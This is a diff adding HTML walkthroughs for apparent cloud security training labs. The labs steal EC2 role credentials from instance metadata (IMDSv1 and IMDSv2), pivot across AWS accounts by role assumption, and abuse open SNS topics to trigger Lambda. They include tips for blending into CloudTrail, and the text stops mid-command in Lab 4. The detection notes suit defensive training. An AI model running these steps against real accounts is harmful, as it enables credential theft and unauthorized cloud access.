@@ -1,0 +1,850 @@
+<!-- M06: IMDS & SNS Exploitation Labs -->
+
+<!-- Lab 1: IMDS v1 Credential Theft -->
+<div class="lab-walkthrough-content" id="M06-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Steal IAM role credentials from an EC2 instance via the unprotected Instance Metadata Service v1 (IMDSv1) and configure them locally for further AWS API exploitation.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Shell access on a target EC2 instance (via SSH, SSM session, or SSRF-based access)</li>
+      <li>The target EC2 instance must have an IAM role attached and IMDSv1 enabled (<code>HttpTokens: optional</code>)</li>
+      <li>AWS CLI v2 installed on your attacker machine (<code>aws --version</code> should show 2.x)</li>
+      <li><code>curl</code> and <code>jq</code> available on the target instance</li>
+      <li>No prior lab dependency — this is the entry point for the M06 chain</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">Query the IMDS base URL to enumerate available metadata categories. IMDSv1 requires no authentication — any HTTP GET from the instance is answered immediately. This confirms IMDS is accessible and reveals available data paths.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl http://169.254.169.254/latest/meta-data/</div>
+            <div class="terminal-output">ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/
+events/
+hostname
+iam/
+identity-credentials/
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+local-hostname
+local-ipv4
+mac
+metrics/
+network/
+placement/
+profile
+public-hostname
+public-ipv4
+public-keys/
+reservation-id
+security-groups
+services/</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Navigate to the IAM security credentials path to discover the name of the IAM role attached to this EC2 instance. The trailing slash causes IMDS to list the role name(s) rather than return credential JSON. This is step one of the required two-step credential theft flow.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+            <div class="terminal-output">EC2-Admin-Role</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Request the temporary STS credentials for the discovered role by appending the role name to the path. These are the same credentials the instance uses for all AWS API calls — they rotate automatically every few hours, so capture them promptly. Note the <code>ASIA</code> prefix on the AccessKeyId, which indicates STS-issued temporary credentials rather than long-term IAM keys.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role</div>
+            <div class="terminal-output">{
+  "Code" : "Success",
+  "LastUpdated" : "2024-01-15T09:30:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAZQ3DEXAMPLEKEY",
+  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfEXAMPLEKEY",
+  "Token" : "FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...rKE8lPYjTuEkamplE=",
+  "Expiration" : "2024-01-15T15:45:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Configure the stolen credentials as a named AWS CLI profile on your attacker machine. Using a named profile avoids polluting your shell environment and lets you switch contexts cleanly. The session token is mandatory for STS temporary credentials — omitting it causes all API calls to fail with <code>InvalidClientTokenId</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws configure set aws_access_key_id ASIAZQ3DEXAMPLEKEY --profile stolen</div>
+            <div class="terminal-cmd">$ aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfEXAMPLEKEY --profile stolen</div>
+            <div class="terminal-cmd">$ aws configure set aws_session_token FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...rKE8lPYjTuEkamplE= --profile stolen</div>
+            <div class="terminal-cmd">$ aws configure set region us-east-1 --profile stolen</div>
+            <div class="terminal-output"># No output on success — the credentials are written to ~/.aws/credentials</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Verify that the stolen credentials work by checking the caller identity using the named profile. You are now operating as the EC2 instance's IAM role from your attacker machine. The <code>AssumedRoleId</code> in the response confirms you hold role credentials, not long-term IAM user credentials.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts get-caller-identity --profile stolen</div>
+            <div class="terminal-output">{
+    "UserId": "AROAZQ3DEXAMPLEID:i-0abc123def456",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/EC2-Admin-Role/i-0abc123def456"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">EC2 Shell</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">curl IMDS (no auth)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Discover Role Name</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Steal Temp Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Configure Profile</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">AWS API as EC2 Role</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> IMDSv1 access is <strong>NOT logged to CloudTrail by default</strong>. There is no API event generated when credentials are fetched via IMDS. The first detectable signal appears when the stolen credentials are used externally — look for CloudTrail events from unexpected source IP addresses. GuardDuty rule <em>InstanceCredentialExfiltration.OutsideAWS</em> fires if credentials issued by EC2 are used from a non-AWS IP. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1552/005/" target="_blank">T1552.005 — Unsecured Credentials: Cloud Instance Metadata API</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>Remove the stolen profile from your attacker machine: manually delete the <code>[stolen]</code> sections from <code>~/.aws/credentials</code> and <code>~/.aws/config</code></li>
+      <li>The IMDS credentials are temporary (STS) and expire automatically — verify with <code>aws sts get-caller-identity --profile stolen</code> returning an auth error after expiry</li>
+      <li>No AWS-side resources were created in this lab — no further cleanup required</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 2: IMDS v2 Bypass and Token-Based Exploitation -->
+<div class="lab-walkthrough-content" id="M06-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Understand IMDSv2 protections, learn the correct two-step token flow, identify instances enforcing IMDSv2, and exploit scenarios where misconfiguration (<code>HttpPutResponseHopLimit &gt; 1</code>) re-opens the attack surface from containers or proxied requests.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completion of M06-L01 (understand IMDSv1 baseline)</li>
+      <li>Shell access on a target EC2 instance with IMDSv2 enforced (<code>HttpTokens: required</code>)</li>
+      <li>A second test instance or container environment with <code>HttpPutResponseHopLimit: 2</code> for the hop-limit bypass section</li>
+      <li><code>curl</code> available on the instance; AWS CLI v2 on attacker machine for the enforcement check</li>
+      <li>IAM permission <code>ec2:DescribeInstances</code> with the stolen credentials from L01 (to run the enforcement check command)</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">Attempt the standard IMDSv1 unauthenticated GET against an instance with IMDSv2 enforced. The 401 response confirms that <code>HttpTokens: required</code> is in effect — unauthenticated IMDS requests are rejected entirely. This is the correct security posture.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -s http://169.254.169.254/latest/meta-data/</div>
+            <div class="terminal-output">&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"&gt;
+&lt;html&gt;&lt;head&gt;&lt;title&gt;401 - Unauthorized&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;401 - Unauthorized&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Obtain an IMDSv2 session token using a <strong>PUT request</strong> — this is the critical distinction from IMDSv1. The <code>X-aws-ec2-metadata-token-ttl-seconds</code> header specifies how long the token remains valid (maximum 21600 seconds / 6 hours). The PUT method was chosen specifically to break simple SSRF exploits that can only send GET requests.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")</div>
+            <div class="terminal-cmd">$ echo $TOKEN</div>
+            <div class="terminal-output">AQAEAHjQ2Xyb8f0pMG7s1nExAmPlEtOkEn9z4rQ5sJ...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Use the session token to query metadata. Pass it in the <code>X-aws-ec2-metadata-token</code> request header. With a valid token, you have identical access to what IMDSv1 provided. First get the role name, then fetch the credentials — the same two-step flow as IMDSv1.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+            <div class="terminal-output">EC2-Admin-Role</div>
+            <div class="terminal-cmd">$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role</div>
+            <div class="terminal-output">{
+  "Code" : "Success",
+  "LastUpdated" : "2024-01-15T09:30:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAZQ3DEXAMPLEKEY",
+  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfEXAMPLEKEY",
+  "Token" : "FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...",
+  "Expiration" : "2024-01-15T15:45:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">From your attacker machine, check the metadata enforcement settings for all target instances. <code>HttpTokens: required</code> means IMDSv2 only. <code>HttpTokens: optional</code> means IMDSv1 is still available. The <code>HttpPutResponseHopLimit</code> field is critical — a value of 2 or higher re-opens IMDS exploitation from containers on the host because the PUT response can traverse the container's virtual network interface.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ec2 describe-instances \
+  --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions]' \
+  --output json --profile stolen | python3 -m json.tool</div>
+            <div class="terminal-output">[
+    [
+        [
+            "i-0abc123def456",
+            {
+                "State": "applied",
+                "HttpTokens": "required",
+                "HttpPutResponseHopLimit": 2,
+                "HttpEndpoint": "enabled",
+                "HttpProtocolIpv6": "disabled",
+                "InstanceMetadataTags": "disabled"
+            }
+        ]
+    ]
+]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Exploit the elevated hop-limit from within a container running on the EC2 host. Container environments like ECS and EKS commonly set <code>HttpPutResponseHopLimit: 2</code> to allow containers to access IMDS. This means a compromised container can perform the full IMDSv2 token exchange and steal the host EC2 role credentials — the same outcome as IMDSv1 from a container's perspective.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># From inside a container on the EC2 instance (hop-limit = 2 allows this):</div>
+            <div class="terminal-cmd">$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")</div>
+            <div class="terminal-cmd">$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role</div>
+            <div class="terminal-output">{
+  "Code" : "Success",
+  "LastUpdated" : "2024-01-15T09:30:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAZQ3DCONTAINERKEY",
+  "SecretAccessKey" : "ContainerSecretKeyEXAMPLE/K7MDENG",
+  "Token" : "FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...",
+  "Expiration" : "2024-01-15T18:00:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">IMDSv1 Blocked (401)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">PUT /api/token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Token Obtained</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">GET with Token Header</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Creds Stolen</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> IMDSv2 token requests are not logged to CloudTrail any more than IMDSv1 requests. The same detection gap applies — credential theft from IMDS goes unlogged until the credentials are used externally. The hop-limit bypass is especially insidious because it is a legitimate configuration for ECS/EKS. GuardDuty: <em>InstanceCredentialExfiltration.OutsideAWS</em>. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1552/005/" target="_blank">T1552.005 — Cloud Instance Metadata API</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>No AWS resources are created in this lab — no infrastructure to tear down</li>
+      <li>Remove any stolen credential profiles from <code>~/.aws/credentials</code> on the attacker machine</li>
+      <li>If you modified an instance's <code>HttpPutResponseHopLimit</code> for testing, restore it: <code>aws ec2 modify-instance-metadata-options --instance-id i-0abc123 --http-put-response-hop-limit 1 --http-tokens required</code></li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 3: IAM Role Assumption with Stolen Credentials -->
+<div class="lab-walkthrough-content" id="M06-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Use stolen EC2 role credentials to enumerate assumable IAM roles, inspect trust policies, and perform cross-account role assumption to pivot into a second AWS account.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completion of M06-L01 or M06-L02 — stolen EC2 role credentials configured as the <code>stolen</code> AWS CLI profile</li>
+      <li>The stolen role must have <code>iam:ListRoles</code> and <code>iam:GetRole</code> permissions (common on admin-style EC2 roles)</li>
+      <li>Target environment must have a cross-account trust relationship configured (pre-built in the lab environment)</li>
+      <li>AWS CLI v2 on attacker machine</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">Use the stolen credentials (configured in the <code>stolen</code> profile from L01) to enumerate all IAM roles in the account. Look for names suggesting elevated privileges, cross-account access, or deployment automation — these are prime pivot targets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table --profile stolen</div>
+            <div class="terminal-output">----------------------------------------------------------------------
+|                           ListRoles                                |
++-------------------------+------------------------------------------+
+|  EC2-Admin-Role         |  arn:aws:iam::123456789012:role/EC2-Admin-Role         |
+|  CrossAccountAdmin      |  arn:aws:iam::987654321098:role/CrossAccountAdmin      |
+|  LambdaExecutionRole    |  arn:aws:iam::123456789012:role/LambdaExecutionRole    |
+|  S3-Backup-Role         |  arn:aws:iam::123456789012:role/S3-Backup-Role         |
+|  DevOps-Deploy          |  arn:aws:iam::123456789012:role/DevOps-Deploy          |
++-------------------------+------------------------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Inspect the trust policy of high-value targets. The trust policy (also called the assume-role policy) defines who is allowed to call <code>sts:AssumeRole</code>. A trust policy referencing our stolen role's ARN or the entire account number means we can pivot into it.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam get-role --role-name CrossAccountAdmin \
+  --query 'Role.AssumeRolePolicyDocument' --profile stolen</div>
+            <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "arn:aws:iam::123456789012:role/EC2-Admin-Role"
+            },
+            "Action": "sts:AssumeRole",
+            "Condition": {}
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Confirm the permissions our stolen identity has before attempting role assumption. The <code>simulate-principal-policy</code> API lets you test IAM policies without making live API calls — useful for pre-flight permission checks that avoid generating unnecessary denied-access CloudTrail noise.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::123456789012:role/EC2-Admin-Role \
+  --action-names sts:AssumeRole \
+  --resource-arns arn:aws:iam::987654321098:role/CrossAccountAdmin \
+  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' \
+  --output table --profile stolen</div>
+            <div class="terminal-output">-------------------------------------------
+|        SimulatePrincipalPolicy          |
++----------------+------------------------+
+|  sts:AssumeRole |  allowed              |
++----------------+------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Assume the target role. The trust policy explicitly allows our stolen <code>EC2-Admin-Role</code> to assume it. This call returns a new set of temporary credentials scoped to the cross-account role in account 987654321098. Choose a <code>--role-session-name</code> that blends in with normal operations to avoid standing out in CloudTrail.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts assume-role \
+  --role-arn arn:aws:iam::987654321098:role/CrossAccountAdmin \
+  --role-session-name deploy-automation \
+  --profile stolen</div>
+            <div class="terminal-output">{
+    "Credentials": {
+        "AccessKeyId": "ASIAZQ3DCROSSACCTKEY",
+        "SecretAccessKey": "CrossAcctSecretKeyEXAMPLE/K7MDENG",
+        "SessionToken": "FwoGZXIvYXdzEBYaDCrossAccount...truncated...",
+        "Expiration": "2024-01-15T16:30:00Z"
+    },
+    "AssumedRoleUser": {
+        "AssumedRoleId": "AROAZQ3DCROSSROLE:deploy-automation",
+        "Arn": "arn:aws:sts::987654321098:assumed-role/CrossAccountAdmin/deploy-automation"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Configure the cross-account credentials as a second named profile and verify you are now operating in the target account. The <code>Account</code> field in the response should show account 987654321098 — a different account than where you started.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws configure set aws_access_key_id ASIAZQ3DCROSSACCTKEY --profile pivot</div>
+            <div class="terminal-cmd">$ aws configure set aws_secret_access_key CrossAcctSecretKeyEXAMPLE/K7MDENG --profile pivot</div>
+            <div class="terminal-cmd">$ aws configure set aws_session_token FwoGZXIvYXdzEBYaDCrossAccount...truncated... --profile pivot</div>
+            <div class="terminal-cmd">$ aws configure set region us-east-1 --profile pivot</div>
+            <div class="terminal-cmd">$ aws sts get-caller-identity --profile pivot</div>
+            <div class="terminal-output">{
+    "UserId": "AROAZQ3DCROSSROLE:deploy-automation",
+    "Account": "987654321098",
+    "Arn": "arn:aws:sts::987654321098:assumed-role/CrossAccountAdmin/deploy-automation"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Stolen EC2 Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate Roles</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inspect Trust Policy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">sts:AssumeRole</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Cross-Account Access</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> <code>sts:AssumeRole</code> IS logged to CloudTrail in both the source and target accounts. In the target account, look for <code>AssumeRole</code> events where <code>userIdentity.sessionContext.sessionIssuer.accountId</code> differs from the event account. GuardDuty: <em>PenTest:IAMUser/KaliLinux</em> or <em>UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B</em> may fire on unusual source IPs. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1548/005/" target="_blank">T1548.005 — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>Remove both the <code>stolen</code> and <code>pivot</code> profiles from <code>~/.aws/credentials</code> and <code>~/.aws/config</code></li>
+      <li>Both sets of credentials are temporary and expire automatically — verify expiry from the <code>Expiration</code> field returned in step 4</li>
+      <li>No AWS resources were created — no infrastructure to tear down</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 4: SNS Topic Enumeration and Lambda/SQS Trigger -->
+<div class="lab-walkthrough-content" id="M06-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Discover SNS topics using stolen EC2 role credentials, enumerate subscriptions to map downstream Lambda/SQS targets, verify topic access policy, and publish crafted messages to trigger downstream execution.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completion of M06-L01 — stolen EC2 role credentials configured as the <code>stolen</code> AWS CLI profile</li>
+      <li>The stolen role must have <code>sns:ListTopics</code>, <code>sns:GetTopicAttributes</code>, <code>sns:ListSubscriptionsByTopic</code>, and <code>sns:Publish</code> permissions</li>
+      <li>Lab environment must have pre-deployed SNS topics with Lambda and SQS subscriptions</li>
+      <li><code>jq</code> installed on attacker machine for JSON parsing</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">List all SNS topics in the account to discover the messaging infrastructure. The API returns up to 100 topics per page — use <code>--next-token</code> to paginate if the account has more. The full topic ARN (not just the name) is required for all subsequent SNS API calls including <code>sns:Publish</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns list-topics --query 'Topics[*].TopicArn' --output text --profile stolen</div>
+            <div class="terminal-output">arn:aws:sns:us-east-1:123456789012:process-orders
+arn:aws:sns:us-east-1:123456789012:user-notifications
+arn:aws:sns:us-east-1:123456789012:system-alerts
+arn:aws:sns:us-east-1:123456789012:deploy-events</div>
+            <div class="terminal-cmd"># If NextToken is present in the full response, paginate:</div>
+            <div class="terminal-cmd">$ aws sns list-topics --next-token &lt;token_value&gt; --query 'Topics[*].TopicArn' --output text --profile stolen</div>
+            <div class="terminal-output"># Additional topic ARNs would appear here in environments with more than 100 topics</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Retrieve the full attributes for a high-value topic. This reveals the subscription count, owner account, and — critically — the access policy. A policy with <code>Principal: *</code> on <code>SNS:Publish</code> means any authenticated AWS identity can inject messages, regardless of account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns get-topic-attributes \
+  --topic-arn arn:aws:sns:us-east-1:123456789012:process-orders \
+  --profile stolen</div>
+            <div class="terminal-output">{
+    "Attributes": {
+        "TopicArn": "arn:aws:sns:us-east-1:123456789012:process-orders",
+        "Owner": "123456789012",
+        "SubscriptionsConfirmed": "3",
+        "SubscriptionsPending": "0",
+        "SubscriptionsDeleted": "0",
+        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"*\"},\"Action\":\"SNS:Publish\",\"Resource\":\"arn:aws:sns:us-east-1:123456789012:process-orders\"}]}"
+    }
+}</div>
+            <div class="terminal-cmd"># Pretty-print the embedded policy JSON:</div>
+            <div class="terminal-cmd">$ aws sns get-topic-attributes \
+  --topic-arn arn:aws:sns:us-east-1:123456789012:process-orders \
+  --query 'Attributes.Policy' --output text \
+  --profile stolen | python3 -m json.tool</div>
+            <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "*"
+            },
+            "Action": "SNS:Publish",
+            "Resource": "arn:aws:sns:us-east-1:123456789012:process-orders"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">List all subscriptions for the target topic to discover downstream services. Confirm subscriptions are in <code>Confirmed</code> state — <code>PendingConfirmation</code> subscriptions do not receive messages. Knowing that Lambda and SQS are subscribed tells us that publishing to this topic will trigger code execution and queue processing.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns list-subscriptions-by-topic \
+  --topic-arn arn:aws:sns:us-east-1:123456789012:process-orders \
+  --profile stolen</div>
+            <div class="terminal-output">{
+    "Subscriptions": [
+        {
+            "SubscriptionArn": "arn:aws:sns:us-east-1:123456789012:process-orders:a1b2c3d4-e5f6-7890-abcd-111111111111",
+            "Owner": "123456789012",
+            "Protocol": "lambda",
+            "Endpoint": "arn:aws:lambda:us-east-1:123456789012:function:order-processor",
+            "TopicArn": "arn:aws:sns:us-east-1:123456789012:process-orders"
+        },
+        {
+            "SubscriptionArn": "arn:aws:sns:us-east-1:123456789012:process-orders:d4e5f6a7-b8c9-0123-efab-222222222222",
+            "Owner": "123456789012",
+            "Protocol": "sqs",
+            "Endpoint": "arn:aws:sqs:us-east-1:123456789012:order-queue",
+            "TopicArn": "arn:aws:sns:us-east-1:123456789012:process-orders"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Publish a crafted message to the topic using its full ARN — the topic name alone is not accepted. The <code>--message</code> payload is delivered as-is to all subscribers — Lambda receives it as a JSON SNS event, SQS stores it as a message body. This triggers the subscribed Lambda function immediately.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns publish \
+  --topic-arn arn:aws:sns:us-east-1:123456789012:process-orders \
+  --subject "Order Processing Test" \
